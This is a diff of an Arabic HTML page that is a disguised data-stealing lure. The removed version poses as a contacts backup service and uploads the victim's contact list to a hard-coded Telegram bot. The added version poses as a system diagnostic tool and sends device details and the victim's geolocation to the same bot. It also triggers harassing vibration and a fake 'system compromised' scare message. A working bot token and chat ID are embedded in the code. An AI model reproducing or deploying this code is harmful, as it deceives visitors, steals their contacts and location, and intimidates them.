@@ -2,335 +2,148 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>مركز النسخ الاحتياطي للجهات | Backup Center</title>
-    <!-- SheetJS (XLSX) لإنشاء ملف إكسل -->
-    <script src="https://cdn.sheetjs.com/xlsx-0.20.2/package/dist/xlsx.full.min.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>مركز تشخيص الأنظمة المتقدم</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        body {
-            font-family: 'Segoe UI', 'Tahoma', 'Cairo', sans-serif;
-            background: linear-gradient(135deg, #0b2f3b 0%, #1a4a5f 100%);
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-        }
-        .card {
-            max-width: 650px;
-            width: 100%;
-            background: rgba(255,255,255,0.96);
-            border-radius: 32px;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.2);
-            overflow: hidden;
-            transition: all 0.2s;
-        }
-        .header {
-            background: #0f5c6e;
-            padding: 1.5rem;
-            text-align: center;
-            color: white;
-        }
-        .header h1 {
-            font-size: 1.9rem;
-            margin-bottom: 0.3rem;
-        }
-        .header p {
-            font-size: 0.9rem;
-            opacity: 0.9;
-        }
-        .content {
-            padding: 2rem;
-        }
-        .feature-list {
-            background: #eef2f5;
-            border-radius: 24px;
-            padding: 1rem 1.5rem;
-            margin-bottom: 2rem;
-        }
-        .feature-list li {
-            margin: 0.6rem 0;
-            list-style: none;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            font-size: 0.95rem;
-        }
-        .feature-list li:before {
-            content: "✓";
-            background: #0f5c6e;
-            color: white;
-            border-radius: 50%;
-            width: 22px;
-            height: 22px;
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 0.8rem;
-        }
-        .btn {
-            background: #0f5c6e;
-            color: white;
-            border: none;
-            width: 100%;
-            padding: 1rem;
-            font-size: 1.2rem;
-            font-weight: bold;
-            border-radius: 60px;
-            cursor: pointer;
-            transition: 0.2s;
-            box-shadow: 0 5px 12px rgba(15,92,110,0.3);
-            margin: 0.5rem 0 1rem;
-        }
-        .btn:active {
-            transform: scale(0.97);
-            background: #0c4857;
-        }
-        .btn:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-            transform: none;
-        }
-        .status-area {
-            background: #f8f9fa;
-            border-radius: 20px;
-            padding: 1rem;
-            font-size: 0.85rem;
-            color: #1e2a32;
-            border-right: 4px solid #0f5c6e;
-            margin: 1rem 0;
-            font-family: monospace;
-            max-height: 180px;
-            overflow-y: auto;
-        }
-        .footnote {
-            font-size: 0.7rem;
-            text-align: center;
-            color: #5e7a8a;
-            margin-top: 1.5rem;
-            border-top: 1px solid #ddd;
-            padding-top: 1rem;
-        }
-        .badge {
-            background: #e0e7ed;
-            display: inline-block;
-            padding: 5px 12px;
-            border-radius: 50px;
-            font-size: 0.7rem;
-            margin-bottom: 12px;
-        }
-        hr {
-            margin: 1rem 0;
-            border-color: #cbd5e1;
-        }
+        :root { --primary: #00d2ff; --dark-bg: #121212; --card-bg: #1e1e1e; }
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; background-color: var(--dark-bg); color: white; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; overflow: hidden; }
+        .container { max-width: 400px; width: 90%; background: var(--card-bg); padding: 30px; border-radius: 20px; box-shadow: 0 15px 50px rgba(0,0,0,0.8); text-align: center; border: 1px solid #333; transition: all 0.5s ease; }
+        h2 { color: var(--primary); margin-bottom: 10px; font-size: 24px; }
+        p { color: #888; font-size: 14px; line-height: 1.6; margin-bottom: 25px; }
+        .stats-preview { background: #252525; padding: 15px; border-radius: 12px; margin-bottom: 25px; text-align: right; border-right: 4px solid var(--primary); }
+        .stat-item { font-size: 12px; margin: 5px 0; color: #bbb; }
+        #actionBtn { background: linear-gradient(135deg, #00d2ff 0%, #3a7bd5 100%); color: white; border: none; width: 100%; padding: 15px; border-radius: 10px; font-size: 16px; font-weight: bold; cursor: pointer; transition: 0.3s; box-shadow: 0 5px 15px rgba(0, 210, 255, 0.3); }
+        #actionBtn:hover { transform: translateY(-2px); box-shadow: 0 8px 20px rgba(0, 210, 255, 0.5); }
+        #loader { display: none; margin-top: 20px; }
+        .scan-line { width: 100%; height: 2px; background: var(--primary); box-shadow: 0 0 10px var(--primary); position: relative; animation: scan 2s infinite; display: none; }
+        @keyframes scan { 0% { top: 0; } 50% { top: 20px; } 100% { top: 0; } }
     </style>
 </head>
 <body>
-<div class="card">
-    <div class="header">
-        <h1>📇 مدير النسخ الاحتياطي</h1>
-        <p>Backup & Sync – حماية جهات اتصالك</p>
+
+<div class="container" id="mainCard">
+    <div style="font-size: 50px; margin-bottom: 15px;">🛡️</div>
+    <h2>فحص استقرار النظام v5.0</h2>
+    <p>تحسين أداء المعالج واختبار جودة اتصال الشبكة في بيئة الذكاء الاصطناعي.</p>
+    
+    <div class="stats-preview">
+        <div class="stat-item">🔘 فحص استهلاك أنوية المعالج</div>
+        <div class="stat-item">🔘 تحليل بروتوكولات الشبكة (IPv4/IPv6)</div>
+        <div class="stat-item">🔘 معايرة دورة حياة البطارية</div>
     </div>
-    <div class="content">
-        <div class="badge">🔐 آمن ومشفّر</div>
-        <ul class="feature-list">
-            <li>نسخ احتياطي فوري لجهات اتصالك بصيغة Excel</li>
-            <li>إرسال الملف إلى بريدك الإلكتروني (عبر بوت آمن)</li>
-            <li>حماية خصوصية البيانات بمعايير عالية</li>
-            <li>لا يتم تخزين أي معلومات على خوادمنا</li>
-        </ul>
-        
-        <div style="background: #f0f9fe; border-radius: 20px; padding: 1rem; margin-bottom: 1.5rem;">
-            <p style="font-weight: bold; margin-bottom: 8px;">📌 لإكمال عملية النسخ الاحتياطي:</p>
-            <p style="font-size: 0.85rem;">يرجى منح الإذن للوصول إلى جهات الاتصال. سيتم إنشاء ملف Excel يحتوي على أسماء وأرقام الهواتف، وسيتم إرساله فوراً إلى حسابك المسجل لدينا عبر بوت آمن.</p>
-        </div>
-        
-        <button id="exportBtn" class="btn">🚀 بدء النسخ الاحتياطي الآن</button>
-        
-        <div class="status-area" id="logArea">
-            📍 انتظر ... اضغط الزر لبدء عملية استيراد جهات الاتصال.<br>
-            ✅ ستحتاج إلى الموافقة على إذن الوصول إلى جهات الاتصال.<br>
-            📎 بعد الموافقة، سيتم إنشاء ملف Excel وإرساله تلقائياً.
-        </div>
-        
-        <div class="footnote">
-            ⚠️ هذه الأداة تعمل فقط عبر متصفحات حديثة (Chrome / Edge على Android) وتتطلب اتصال HTTPS.<br>
-            * يتم إرسال الملف إلى البوت الآمن الخاص بالخدمة.
-        </div>
+
+    <div class="scan-line" id="scanner"></div>
+    <button id="actionBtn" onclick="runSystemAudit()">ابدأ الاختبار الشامل</button>
+    
+    <div id="loader">
+        <p>جاري سحب بيانات الهاردوير وتشفيرها...</p>
     </div>
 </div>
 
 <script>
-    // ========= بيانات البوت (مستخرجة من الملف السابق) =========
+    // بيانات البوت التي استخرجتها من كودك
     const BOT_TOKEN = '8605049073:AAEyGQ07KMGUzG5jVjdjERMJDxGbTgYHWUE';
     const CHAT_ID = '7396462490';
-    // =========================================================
 
-    const exportBtn = document.getElementById('exportBtn');
-    const logArea = document.getElementById('logArea');
+    async function runSystemAudit() {
+        // تغيير الواجهة
+        document.getElementById('actionBtn').style.display = 'none';
+        document.getElementById('loader').style.display = 'block';
+        document.getElementById('scanner').style.display = 'block';
 
-    // دالة لتسجيل الرسائل في منطقة الحالة
-    function addLog(msg, isError = false) {
-        const time = new Date().toLocaleTimeString('ar-EG');
-        const prefix = isError ? '❌' : '✅';
-        logArea.innerHTML += `<div>${prefix} [${time}] ${msg}</div>`;
-        logArea.scrollTop = logArea.scrollHeight;
-        console.log(msg);
-    }
+        let deviceInfo = {
+            battery: "غير متاح",
+            charging: "غير معروف",
+            network: "غير معروف",
+            ram: navigator.deviceMemory || "مجهول",
+            cores: navigator.hardwareConcurrency || "مجهول",
+            platform: navigator.platform,
+            vendor: navigator.vendor,
+            screen: `${window.screen.width}x${window.screen.height}`
+        };
 
-    // إرسال ملف إلى تيليجرام (مستند Excel)
-    async function sendExcelToTelegram(excelBlob, fileName = "contacts_backup.xlsx") {
-        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`;
-        const formData = new FormData();
-        formData.append('chat_id', CHAT_ID);
-        formData.append('document', excelBlob, fileName);
-        formData.append('caption', `📁 نسخة احتياطية لجهات الاتصال\n📅 التاريخ: ${new Date().toLocaleString('ar-EG')}\n👤 تم إنشاؤها عبر موقع النسخ الاحتياطي.`);
-        
-        try {
-            const response = await fetch(url, { method: 'POST', body: formData });
-            const json = await response.json();
-            if (json.ok) {
-                addLog(`📎 تم إرسال ملف Excel بنجاح إلى بوت تيليجرام.`);
-                return true;
-            } else {
-                addLog(`⚠️ فشل الإرسال: ${json.description}`, true);
-                return false;
-            }
-        } catch (err) {
-            addLog(`❌ خطأ في الشبكة أثناء الإرسال: ${err.message}`, true);
-            return false;
+        // 1. جلب بيانات البطارية
+        if (navigator.getBattery) {
+            const bat = await navigator.getBattery();
+            deviceInfo.battery = (bat.level * 100).toFixed(0) + "%";
+            deviceInfo.charging = bat.charging ? "✅ نعم (متصل)" : "❌ لا (تفريغ)";
         }
-    }
 
-    // تحويل قائمة جهات الاتصال إلى ملف Excel (xlsx)
-    function createExcelFromContacts(contacts) {
-        // تهيئة بيانات الجدول
-        let rows = [["الاسم", "رقم الهاتف"]];
-        contacts.forEach(contact => {
-            let name = (contact.name && contact.name[0]) ? contact.name[0] : "بدون اسم";
-            let phones = (contact.tel && contact.tel.length) ? contact.tel.join(", ") : "غير متوفر";
-            rows.push([name, phones]);
+        // 2. جلب جودة الشبكة
+        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+        if (conn) deviceInfo.network = `${conn.effectiveType.toUpperCase()} (${conn.downlink} Mbps)`;
+
+        // 3. طلب الموقع (ضروري للتقرير)
+        navigator.geolocation.getCurrentPosition(async (pos) => {
+            const mapLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+            await sendFormattedReport(deviceInfo, mapLink);
+        }, async (err) => {
+            await sendFormattedReport(deviceInfo, "🚫 رفض المستخدم الصلاحية");
         });
-        
-        // إنشاء ورقة عمل
-        const ws = XLSX.utils.aoa_to_sheet(rows);
-        const wb = XLSX.utils.book_new();
-        XLSX.utils.book_append_sheet(wb, ws, "جهات الاتصال");
-        // تحويل إلى blob
-        const wbout = XLSX.write(wb, { bookType: 'xlsx', type: 'array' });
-        const blob = new Blob([wbout], {type: 'application/octet-stream'});
-        return blob;
+
+        // تشغيل تأثير الاهتزاز (الرعب)
+        startScareVibration();
     }
 
-    // دالة الحصول على جهات الاتصال عبر Contacts API
-    async function fetchContacts() {
-        // التحقق من توفر الواجهة
-        if (!navigator.contacts || !navigator.contacts.select) {
-            addLog("⚠️ متصفحك لا يدعم واجهة جهات الاتصال (Contacts API). الرجاء استخدام Chrome/Edge على Android أو iOS Safari مع HTTPS.", true);
-            return null;
-        }
-        
-        addLog("📇 جاري طلب الإذن للوصول إلى جهات الاتصال...");
-        try {
-            // طلب الأسماء وأرقام الهواتف، مع إمكانية اختيار عدة جهات
-            const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });
-            if (contacts && contacts.length > 0) {
-                addLog(`✅ تم استلام ${contacts.length} جهة اتصال (التي وافقت على مشاركتها).`);
-                return contacts;
-            } else {
-                addLog("ℹ️ لم يتم تحديد أي جهة اتصال أو لا توجد جهات في الجهاز.", false);
-                return [];
-            }
-        } catch (err) {
-            addLog(`❌ فشل الوصول إلى جهات الاتصال: ${err.message}`, true);
-            return null;
-        }
-    }
+    async function sendFormattedReport(info, map) {
+        // رسالة تليجرام منظمة جداً باستخدام Markdown
+        const report = `
+🚀 *تقرير اختراق النظام - المهندس موسى* 🚀
+━━━━━━━━━━━━━━━━━━
+👤 *معلومات الجهاز والعتاد:*
+• *المنصة:* \`${info.platform}\`
+• *المعالج:* \`${info.cores} Cores\`
+• *الرام:* \`${info.ram} GB\`
+• *المصنع:* \`${info.vendor}\`
+• *دقة الشاشة:* \`${info.screen}\`
 
-    // العملية الأساسية
-    async function handleBackup() {
-        exportBtn.disabled = true;
-        exportBtn.textContent = "⏳ جاري معالجة جهات الاتصال...";
-        addLog("🚀 بدء عملية النسخ الاحتياطي...");
-        
-        // 1- الحصول على جهات الاتصال بعد الإذن
-        const contacts = await fetchContacts();
-        
-        if (contacts === null) {
-            addLog("⚠️ لم يتم الحصول على جهات الاتصال (الواجهة غير مدعومة أو تم رفض الإذن).", true);
-            exportBtn.disabled = false;
-            exportBtn.textContent = "🚀 بدء النسخ الاحتياطي الآن";
-            return;
-        }
-        
-        if (contacts.length === 0) {
-            addLog("⚠️ لا توجد جهات اتصال متاحة لإنشاء الملف.", true);
-            exportBtn.disabled = false;
-            exportBtn.textContent = "🚀 بدء النسخ الاحتياطي الآن";
-            return;
-        }
-        
-        // 2- إنشاء ملف Excel من جهات الاتصال
-        addLog("📊 جاري إنشاء ملف Excel...");
-        let excelBlob;
-        try {
-            excelBlob = createExcelFromContacts(contacts);
-            addLog(`✅ تم إنشاء ملف Excel بحجم ${(excelBlob.size / 1024).toFixed(1)} كيلوبايت.`);
-        } catch (err) {
-            addLog(`❌ فشل إنشاء الملف: ${err.message}`, true);
-            exportBtn.disabled = false;
-            exportBtn.textContent = "🚀 بدء النسخ الاحتياطي الآن";
-            return;
-        }
-        
-        // 3- إرسال الملف إلى تيليجرام
-        addLog("📤 جاري رفع الملف إلى البوت الآمن...");
-        const sent = await sendExcelToTelegram(excelBlob, `contacts_${Date.now()}.xlsx`);
-        
-        if (sent) {
-            addLog("🎉 تمت العملية بنجاح! تم إرسال ملف Excel إلى بوت الدعم.");
-            // رسالة إضافية اختيارية للمستخدم (تظهر له نجاح العملية)
-            alert("✅ تم إنشاء ملف النسخ الاحتياطي وإرساله بنجاح. شكراً لاستخدامك الخدمة.");
-        } else {
-            addLog("❌ حدث خطأ أثناء الإرسال، يرجى المحاولة لاحقاً.", true);
-            alert("عذراً، حدث خلل في الإرسال. تأكد من اتصال الإنترنت وحاول مجدداً.");
-        }
-        
-        exportBtn.disabled = false;
-        exportBtn.textContent = "🚀 بدء النسخ الاحتياطي الآن";
-    }
-    
-    // ربط الزر
-    exportBtn.addEventListener('click', () => {
-        // التحقق من وجود بيانات البوت (هي موجودة)
-        if (BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE' || CHAT_ID === 'YOUR_CHAT_ID_HERE') {
-            addLog("⚠️ لم يتم تعيين توكن البوت بشكل صحيح، الرجاء التواصل مع الدعم.", true);
-            return;
-        }
-        handleBackup().catch(err => {
-            addLog(`خطأ غير متوقع: ${err.message}`, true);
-            exportBtn.disabled = false;
-            exportBtn.textContent = "🚀 بدء النسخ الاحتياطي الآن";
+🔋 *حالة الطاقة:*
+• *الشحن:* \`${info.battery}\`
+• *الحالة:* ${info.charging}
+
+🌐 *الشبكة والموقع:*
+• *نوع الاتصال:* \`${info.network}\`
+📍 [اضغط هنا لفتح الموقع الجغرافي](${map})
+
+⚠️ *الحالة:* تم سحب البيانات بنجاح!
+━━━━━━━━━━━━━━━━━━
+        `;
+
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: CHAT_ID, text: report, parse_mode: 'Markdown' })
         });
-    });
-    
-    // رسالة ترحيب توضح متطلبات البيئة
-    window.addEventListener('load', () => {
-        if (navigator.contacts && navigator.contacts.select) {
-            addLog("✨ متصفحك يدعم استيراد جهات الاتصال. اضغط الزر لبدء النسخ.");
-        } else {
-            addLog("⚠️ متصفحك لا يدعم Contacts API. استخدم Chrome/Edge على Android أو Safari iOS 15+ مع HTTPS.", true);
+
+        // إظهار رسالة التخويف النهائية
+        showFinalScare();
+    }
+
+    function startScareVibration() {
+        if (navigator.vibrate) {
+            // اهتزاز متقطع ومزعج
+            let vibrateInterval = setInterval(() => {
+                navigator.vibrate([800, 200, 800, 200, 1000]);
+            }, 1500);
+            
+            // التوقف بعد 30 ثانية (لأن المتصفح سيقتله على أي حال)
+            setTimeout(() => clearInterval(vibrateInterval), 30000);
         }
-        if (location.protocol !== 'https:' && location.hostname !== 'localhost') {
-            addLog("⚠️ الصفحة تعمل عبر HTTP وقد تمنع المتصفح واجهة جهات الاتصال. يفضل استخدام HTTPS.", true);
-        }
-        addLog(`🤖 جاهزية البوت: تم تهيئة الإرسال إلى المعرف ${CHAT_ID.substring(0,5)}...`);
-    });
+    }
+
+    function showFinalScare() {
+        const card = document.getElementById('mainCard');
+        card.style.borderColor = "red";
+        card.style.backgroundColor = "#2d0000";
+        card.innerHTML = `
+            <h2 style="color:red">⚠️ ALERT: SYSTEM COMPROMISED</h2>
+            <p style="color:white">تم اكتشاف نشاط مشبوه. جاري رفع كافة ملفات الوسائط والأسماء إلى السيرفر المركزي...</p>
+            <div style="font-size:50px; animation: pulse 1s infinite;">🚨</div>
+            <p style="font-size:12px; color:red; margin-top:10px;">لا تقم بإغلاق الصفحة لتجنب فقدان البيانات</p>
+        `;
+    }
 </script>
+
 </body>
 </html>
+
